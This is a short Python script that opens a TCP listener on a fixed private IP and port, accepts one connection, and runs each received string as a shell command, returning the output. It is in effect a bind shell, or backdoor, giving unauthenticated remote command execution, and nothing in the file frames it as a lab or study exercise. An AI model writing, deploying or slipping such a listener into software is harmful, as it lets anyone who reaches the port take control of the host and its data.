#!/usr/bin/python36

import socket
import subprocess as sp

s=socket.socket()
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
#to remove "already in use" error

port=1234
ip="192.168.43.44"

s.bind((ip,port))
s.listen()

csession,caddr=s.accept()

while True:
	data=csession.recv(50)
	out=sp.getoutput(data.decode())
	csession.send(out.encode())
csession.close()
s.close()
